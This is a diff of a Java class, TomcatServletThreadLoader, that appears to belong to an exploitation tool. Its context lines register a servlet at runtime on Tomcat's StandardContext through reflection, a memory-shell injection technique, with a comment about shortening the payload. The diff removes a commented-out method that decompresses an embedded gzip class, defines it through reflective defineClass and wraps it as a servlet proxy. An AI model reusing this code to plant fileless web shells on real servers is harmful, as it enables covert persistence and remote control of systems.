@@ -92,7 +92,6 @@ public class TomcatServletThreadLoader {
         invokeMethod(standardContext.getClass().getSuperclass(), standardContext, "addChildInternal", new Class[]{Class.forName("org.apache.catalina.Container")}, new Object[]{standardWrapper});
 //        invokeMethod(standardContext.getClass(), standardContext, "addChild", new Class[]{Class.forName("org.apache.catalina.Container")}, new Object[]{standardWrapper});
 
-
 //        // 取一种 缩短 payload
         invokeMethod(standardContext.getClass(), standardContext, "addServletMapping", new Class[]{String.class, String.class}, new Object[]{PATH, NAME});
 //        try {
@@ -148,36 +147,6 @@ public class TomcatServletThreadLoader {
 
         return null;
     }
-
-//    public static Object getObject() throws Exception {
-//        // 动态代理兼容 javax jakarta
-//        Class servletClass = null;
-//        try {
-//            servletClass = Class.forName("jakarta.servlet.Servlet");
-//        } catch (Exception e) {
-//            try {
-//                servletClass = Class.forName("javax.servlet.Servlet");
-//            } catch (ClassNotFoundException ex) {
-//
-//            }
-//        }
-//
-//        byte[] bytes = decompress(gzipObject);
-//        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
-//        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
-//        defineClass.setAccessible(true);
-//        Class clazz;
-//        try {
-//            clazz = (Class) defineClass.invoke(classLoader, bytes, 0, bytes.length);
-//        } catch (Exception e) {
-//            clazz = classLoader.loadClass(CLASSNAME);
-//        }
-//        Object javaObject = clazz.newInstance();
-//        Object object = Proxy.newProxyInstance(servletClass.getClassLoader(), new Class[]{servletClass}, (InvocationHandler) javaObject);
-//
-//        return object;
-//    }
-
 
     // tools
     public static byte[] decompress(String gzipObject) throws IOException {
